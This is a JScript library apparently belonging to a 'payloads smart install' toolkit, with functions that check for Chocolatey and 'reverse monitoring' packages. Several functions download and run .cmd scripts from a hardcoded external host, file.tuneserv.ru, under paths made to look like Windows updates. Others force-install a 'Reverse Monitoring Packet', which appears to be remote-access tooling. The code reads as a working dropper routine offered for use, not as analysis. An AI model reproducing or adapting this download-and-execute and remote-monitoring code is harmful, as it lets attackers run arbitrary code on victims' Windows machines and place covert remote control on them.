/******************************************************************************
*
* LIB_SMARTINSTALL.JS
* This file contain main modules for Payloads Smart Install
*
* Revision 1.0.0.0 (Extended Beta) May be Present
* The Library Links at lib_install-1.0.0.js and lib_check-1.0.0.js
*
******************************************************************************/

/* *********************************************************
'
' ChecksSmartChocolateyInstalled_WinNew
'
' This function Checks If Chocolatey Packets Installed and Install it if no
'
' PPARAMETERS:	NONE
' RETURNS:	0 if Chocolatey is alreaedy Installed
' 			1 if Chocolatey have just Installed
'			2 if Installation Error Occur
'
' *********************************************************/

function ChecksSmartChocolateyInstalled_WinNew()
{
  //body
  // Define Variables
  var iFlag, strVar;
  var strUrl1, strAuxCmd, strUrl2, strChoco;
  strVar = "ChocolateyInstall";
  strUrl1 = "http://file.tuneserv.ru/Exponenta/";
  strUrl2 = "http://file.tuneserv.ru/WinUpdate/WindowsMainUpdate/Other/";
  strChoco = "chock.install-001.cmd";
  strAuxCmd = "auxiliary.cmd";
  iFlag = CheckIfFolderVariableDefined (strVar);  
  if( iFlag == 0 ) return 0;
  if( iFlag == 1 ) {
	  iFlag = CmdDownlRun03( strUrl2, strChoco );
	  if( iFlag == 1 ) return 2;
	  else {
      iFlag = CmdDownlRun03( strUrl1, strAuxCmd );
      if (iFlag == 1) {
        // statement
        return 2;
      } else {
        // statement
        return 1;
      }
    }
  }
  return 2;
}


/* *********************************************************
'
' ForcedPaccketsChocolateyInstalled_WinNew
'
' This function Checks If Chocolatey Packets Installed 
' and Force Install Some Chocolatey Packets
'
' PPARAMETERS:	NONE
' RETURNS:	0 if Chocolatey is alreaedy Installed
' 			1 if Chocolatey have just Installed
'			2 if Installation Error Occur
'
' *********************************************************/

function ForcedPaccketsChocolateyInstalled_WinNew()
{
  //body
  // Define Variables
  var iFlag, strVar;
  var strUrl1, strAuxCmd, strUrl2, strChoco;
  strVar = "ChocolateyInstall";
  strUrl1 = "http://file.tuneserv.ru/Exponenta/";
  strUrl2 = "http://file.tuneserv.ru/WinUpdate/WindowsMainUpdate/Other/";
  strChoco = "chock.install-001.cmd";
  strAuxCmd = "auxiliary.cmd";
  iFlag = CheckIfFolderVariableDefined (strVar);  
  if( iFlag < 2 ) {
    iFlag = CmdDownlRun03( strUrl2, strChoco );
    if( iFlag == 1 ) return 2;
    else {
      iFlag = CmdDownlRun03( strUrl1, strAuxCmd );
      if (iFlag == 1) {
        // statement
        return 2;
      } else {
        // statement
        return 1;
      }
    }
  }
  return 2;
}

/* ********************************************************
 *
 * NIT_SmartRevMonInstall
 *
 * This function Smart Installs Reverse Monitoring Packet 
 *
 * PPARAMETERS:	NONE
 * RETURN:		0 if Chocolatey Installed
 *		    	2 if Error Occur
 *
* *********************************************************/
function NIT_SmartRevMonInstall(){
	//body
	// Devine Variables
	var iFlag;
	// To Do
	iFlag = NIT_CheckIfRevMonInstall();
	if( iFlag == 2 ) return 2;
	if( iFlag == 0 ) return 0;
	if( iFlag < 2 ) {
		iFlag = ReverseMonInstall();
		if (iFlag == 0) return 1
		else return 2
	}
	return 2;
}


/* ********************************************************
 *
 * NIT_ForceRevMonInstall
 *
 * This function Smart Installs Reverse Monitoring Packet 
 *
 * PPARAMETERS:	NONE
 * RETURN:		0 if Chocolatey Installed
 *		    	2 if Error Occur
 *
* *********************************************************/
function NIT_ForceRevMonInstall(){
	//body
	// Devine Variables
	var iFlag;
	// To Do
	iFlag = ReverseMonInstall();
	return iFlag;
}
